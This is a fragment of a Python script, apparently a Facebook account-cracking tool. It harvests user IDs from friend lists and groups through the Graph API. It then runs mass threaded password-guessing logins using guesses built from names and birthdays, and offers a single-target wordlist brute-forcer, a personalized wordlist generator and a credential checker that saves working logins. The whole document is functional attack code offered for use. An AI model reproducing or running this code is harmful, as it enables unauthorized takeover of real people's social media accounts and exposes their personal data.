				x = requests.get("https://graph.facebook.com/"+username+"?access_token="+mpsh['access_token'])
				z = json.loads(x.text)
				sucessful.append("\033[1;97m[ \033[1;92mOK✓\033[1;97m ] "+username+"|" +passw+" =>"+z['name'])
			elif 'www.facebook.com' in mpsh["error_msg"]:
				cek = open("out/mbf_cp.txt", "w")
				cek.write(username+"|"+passw+"\n")
				cek.close()
				checkpoint.append("\033[1;97m[ \033[1;93mCP✚\033[1;97m ] "+username+"|" +passw)
			else:
				action_failed.append(username)
				back +=1
			sys.stdout.write('\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack    \033[1;91m:\033[1;97m '+str(back)+' \033[1;96m>\033[1;97m '+str(len(up))+' =>\033[1;92mLive\033[1;91m:\033[1;96m'+str(len(sucessful))+' \033[1;97m=>\033[1;93mCheck\033[1;91m:\033[1;96m'+str(len(checkpoint)));sys.stdout.flush()
	except IOError:
		print"\n\033[1;91m[!] Sleep"
		time.sleep(0.01)
	except requests.exceptions.ConnectionError:
		print"\033[1;91m[✖] No connection"

def success():
	print
	print 42*"\033[1;97m═"
	###sucessful
	for b in sucessful:
		print(b)
	###CEK
	for c in checkpoint:
		print(c)
	###action_failed
	print 42*"\033[1;97m═"
	print ("\033[31m[x] Failed \033[1;97m--> " + str(len(action_failed)))
	failed()

############### SUPER MBF ################
def super():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.0)
		login()
	os.system('clear')
	print logo
	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Crack with list friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Crack from friend"
	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Crack from member group"
        print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Crack from File"
	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
	print "║"
	choices_super()

def choices_super():
	peak = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
	if peak =="":
		print "\033[1;91m[!] Wrong input"
		choices_super()
	elif peak =="1":
		os.system('clear')
		print logo
		jalan('\033[1;91m[✺] \033[1;92mGet all friend id \033[1;97m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+fb_token)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] Friend not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet all id from friend \033[1;97m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+fb_token)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		idg=raw_input('\033[1;91m[+] \033[1;92mInput ID group \033[1;91m:\033[1;97m ')
		try:
			r=requests.get('https://graph.facebook.com/group/?id='+idg+'&access_token='+fb_token)
			asw=json.loads(r.text)
			print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom group \033[1;91m:\033[1;97m "+asw['name']
		except KeyError:
			print"\033[1;91m[!] Group not found"
			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			super()
		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=9999999999999&access_token='+fb_token)
		s=json.loads(re.text)
		for p in s['data']:
			id.append(p['id'])
        elif peak == "4":
                os.system('clear')
                print logo
                try:
                        idlist = raw_input('\033[1;91m[+] \033[1;92mFile ID  \033[1;91m: \033[1;97m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                except KeyError:
                        print '\033[1;91m[!] File not found'
                        raw_input('\n\033[1;91m[ \033[1;97mBack \033[1;91m]')
                        super()
	elif peak =="0":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong input"
		choices_super()

        print "\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
        jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	tiload = ['.   ','..  ','... ']
	for o in tiload:
		print("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
        print 42*"\033[1;97m═"


	##### crack #####
	def main(arg):
		global checkpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			#Pass1
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
			b = json.loads(a.text)
			pass1 = b['first_name']+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass1+" =>"+z['name'])
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					cek = open("out/super_cp.txt", "a")
					cek.write(user+"|"+pass1+"\n")
					cek.close()
					checkpoint.append(user+pass1)
				else:
					#Pass2
					pass2 = b['first_name']+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if 'access_token' in q:
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
						z = json.loads(x.text)
						print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass2+" =>"+z['name'])
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							cek = open("out/super_cp.txt", "a")
							cek.write(user+"|"+pass2+"\n")
							cek.close()
							checkpoint.append(user+pass2)
						else:
							#Pass3
							pass3 = b['last_name'] + '123'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if 'access_token' in q:
								x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
								z = json.loads(x.text)
								print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass3+" =>"+z['name'])
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									cek = open("out/super_cp.txt", "a")
									cek.write(user+"|"+pass3+"\n")
									cek.close()
									checkpoint.append(user+pass3)
								else:
									#Pass4
									lahir = b['birthday']
									pass4 = lahir.replace('/', '')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
										x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										z = json.loads(x.text)
										print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass4+" =>"+z['name'])
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											cek = open("out/super_cp.txt", "a")
											cek.write(user+"|"+pass4+"\n")
											cek.close()
											checkpoint.append(user+pass4)
										else:
											#Pass5
											pass5 = "sayang123","sayangku123"
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if 'access_token' in q:
												x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
												z = json.loads(x.text)
												print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass5+" =>"+z['name'])
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													cek = open("out/super_cp.txt", "a")
													cek.write(user+"|"+pass5+"\n")
													cek.close()
													checkpoint.append(user+pass5)
												else:
													#Pass6
													pass6 = "bintang123","bintang12345"
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if 'access_token' in q:
														x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
														z = json.loads(x.text)
														print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass6+" =>"+z['name'])
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															cek = open("out/super_cp.txt", "a")
															cek.write(user+"|"+pass6+"\n")
															cek.close()
															checkpoint.append(user+pass6)
														else:
															#Pass7
															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
															b = json.loads(a.text)
															pass7 = "1234567890","password123","michelle","someone","","iloveyou","princess","playboy"
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if 'access_token' in q:
																x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
																z = json.loads(x.text)
																print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass7+" =>"+z['name'])
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	cek = open("out/super_cp.txt", "a")
																	cek.write(user+"|"+pass7+"\n")
																	cek.close()
																	checkpoint.append(user+pass7)
                                                                                                                                else:
                                                                                                                                        #Pass8
                                                                                                                                         a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+fb_token)
                                                                                                                                         b = json.loads(a.text)
                                                                                                                                         pass8 = "january","february","march","april","may","june","july","august","september","november","december"
                                                                                                                                         data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%252525257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
                                                                                                                                         q = json.load(data)
                                                                                                                                         if 'access_token' in q:
                                                                                                                                                 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
                                                                                                                                                 z = json.loads(x.text)
                                                                                                                                                 print("\033[1;97m[ \033[1;92m✓\033[1;97m ] "+user+"|" +pass8+" =>"+z['name'])
                                                                                                                                                 oks.append(user+pass8)
                                                                                                                                         else:
                                                                                                                                                 if 'www.facebook.com' in q["error_msg"]:
                                                                                                                                                         cek = open("out/super_cp.txt", "a")
                                                                                                                                                         cek.write(user+"|"+pass8+"\n")
                                                                                                                                                         cek.close()
                                                                                                                                                         checkpoint.append(user+pass8)

		except:
			pass

	p = ThreadPool(30)
	p.map(main, id)
	print 42*"\033[1;97m═"
	print '\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mDone \033[1;97m....'
	print"\033[1;91m[+] \033[1;92mTotal OK/CP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(checkpoint))
	print("\033[1;91m[+] \033[1;92mCP File saved \033[1;91m: \033[1;97mout/super_cp.txt")
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	super()
######################################################

##### BRUTE FORCE #####
def brute():
	global fb_token
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	try:
		email = raw_input("\033[1;91m[+] \033[1;92mID\033[1;97m/\033[1;92mEmail\033[1;97m/\033[1;92mHp \033[1;97mTarget \033[1;91m:\033[1;97m ")
		passw = raw_input("\033[1;91m[+] \033[1;92mWordlist \033[1;97mext(list.txt) \033[1;91m: \033[1;97m")
		total = open(passw,"r")
		total = total.readlines()
		print 42*"\033[1;97m═"
		print"\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mTarget \033[1;91m:\033[1;97m "+email
		print "\033[1;91m[+] \033[1;92mTotal\033[1;96m "+str(len(total))+" \033[1;92mPassword"
		jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
		sandi = open(passw,"r")
		for pw in sandi:
			try:
				pw = pw.replace("\n","")
				sys.stdout.write("\r\033[1;91m[\033[1;96m✸\033[1;91m] \033[1;92mCrack \033[1;91m: \033[1;97m"+pw)
				sys.stdout.flush()
				data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(email)+"&locale=en_US&password="+(pw)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				mpsh = json.loads(data.text)
				if 'access_token' in mpsh:
					dapat = open("Brute.txt", "w")
					dapat.write(email+" | "+pw+"\n")
					dapat.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					failed()
				elif 'www.facebook.com' in mpsh["error_msg"]:
					ceks = open("Brutecheckpoint.txt", "w")
					ceks.write(email+" | "+pw+"\n")
					ceks.close()
					print "\n\033[1;91m[+] \033[1;92mFound"
					print 42*"\033[1;97m═"
					print "\033[1;91m[!] \033[1;93mAccount Checkpoint"
					print("\033[1;91m[➹] \033[1;92mUsername \033[1;91m:\033[1;97m "+email)
					print("\033[1;91m[➹] \033[1;92mPassword \033[1;91m:\033[1;97m "+pw)
					failed()
			except requests.exceptions.ConnectionError:
				print"\033[1;91m[!] Connection Error"
				time.sleep(0.01)
	except IOError:
		print ("\033[1;91m[!] File not found")
		tanyaw()
def tanyaw():
	why = raw_input("\033[1;91m[?] \033[1;92mCreate wordlist ? \033[1;92m[y/n]\033[1;91m:\033[1;97m ")
	if why =="":
		print "\033[1;91m[!] Wrong"
		tanyaw()
	elif why =="y":
		wordlist()
	elif why =="Y":
		wordlist()
	elif why =="n":
		menu_hack()
	elif why =="N":
		menu_hack()
	else:
		print "\033[1;91m[!] Wrong"
		tanyaw()


########### CREATE WORDLIST ##########
def wordlist():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	try:
		os.system('clear')
		print logo
		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
		print 42*"\033[1;97m═"
		a = raw_input("\033[1;91m[+] \033[1;92mfb_name Depan \033[1;97m: ")
		file = open(a+".txt", 'w')
		b=raw_input("\033[1;91m[+] \033[1;92mfb_name Tengah \033[1;97m: ")
		c=raw_input("\033[1;91m[+] \033[1;92mfb_name Belakang \033[1;97m: ")
		d=raw_input("\033[1;91m[+] \033[1;92mfb_name Panggilan \033[1;97m: ")
		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		f=e[0:2]
		g=e[2:4]
		h=e[4:]
		print 42*"\033[1;97m═"
		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
		i=raw_input("\033[1;91m[+] \033[1;92mfb_name Pacar \033[1;97m: ")
		j=raw_input("\033[1;91m[+] \033[1;92mfb_name Panggilan Pacar \033[1;97m: ")
		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
		l=k[0:2]
		m=k[2:4]
		n=k[4:]
		file.write("%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % (a,c,a,b,b,a,b,c,c,a,c,b,a,a,b,b,c,c,a,d,b,d,c,d,d,d,d,a,d,b,d,c,a,e,a,f,a,g,a,h,b,e,b,f,b,g,b,h,c,e,c,f,c,g,c,h,d,e,d,f,d,g,d,h,e,a,f,a,g,a,h,a,e,b,f,b,g,b,h,b,e,c,f,c,g,c,h,c,e,d,f,d,g,d,h,d,d,d,a,f,g,a,g,h,f,g,f,h,f,f,g,f,g,h,g,g,h,f,h,g,h,h,h,g,f,a,g,h,b,f,g,b,g,h,c,f,g,c,g,h,d,f,g,d,g,h,a,i,a,j,a,k,i,e,i,j,i,k,b,i,b,j,b,k,c,i,c,j,c,k,e,k,j,a,j,b,j,c,j,d,j,j,k,a,k,b,k,c,k,d,k,k,i,l,i,m,i,n,j,l,j,m,j,n,j,k))
		wg = 0
		while (wg < 100):
			wg = wg + 1
			file.write(a + str(wg) + '\n')
		en = 0
		while (en < 100):
			en = en + 1
			file.write(i + str(en) + '\n')
		word = 0
		while (word < 100):
			word = word + 1
			file.write(d + str(word) + '\n')
		gen = 0
		while (gen < 100):
			gen = gen + 1
			file.write(j + str(gen) + '\n')
		file.close()
		time.sleep(1.5)
		print 42*"\033[1;97m═"
		print ("\033[1;91m[+] \033[1;92mSaved \033[1;91m: \033[1;97m %s.txt" %a)
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	except IOError, e:
		print("\033[1;91m[!] Failed")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()

##### CHECKER #####
def check_akun():
	os.system('clear')
	try:
		fb_token=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] Token not found"
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		login()
	os.system('clear')
	print logo
	print "\033[1;91m[?] \033[1;92mCreate in file\033[1;91m : \033[1;97musername|password"
	print 42*"\033[1;97m═"
	live = []
	cek = []
	die = []
	try:
		file = raw_input("\033[1;91m[+] \033[1;92mFile path \033[1;91m:\033[1;97m ")
		list = open(file,'r').readlines()
	except IOError:
		print ("\033[1;91m[!] File not found")
		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		lain()
	pemisah = raw_input("\033[1;91m[+] \033[1;92mSeparator \033[1;91m:\033[1;97m ")
	jalan('\033[1;91m[✺] \033[1;92mStart \033[1;97m...')
	print 42*"\033[1;97m═"
	for meki in list:
		username, password = (meki.strip()).split(str(pemisah))
		url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
		data = requests.get(url)
		mpsh = json.loads(data.text)
		if 'access_token' in mpsh:
			live.append(password)
			print"\033[1;97m[ \033[1;92mLive\033[1;97m ] \033[1;97m"+username+"|"+password
		elif 'www.facebook.com' in mpsh["error_msg"]:
			cek.append(password)
			print"\033[1;97m[ \033[1;93mCheck\033[1;97m ] \033[1;97m"+username+"|"+password
		else:
			die.append(password)
			print"\033[1;97m[ \033[1;91mDie\033[1;97m ] \033[1;97m"+username+"|"+password
	print 42*"\033[1;97m═"
	print"\033[1;91m[+] \033[1;92mTotal\033[1;91m : \033[1;97mLive=\033[1;92m"+str(len(live))+" \033[1;97mCheck=\033[1;93m"+str(len(cek))+" \033[1;97mDie=\033[1;91m"+str(len(die))
	raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
	lain()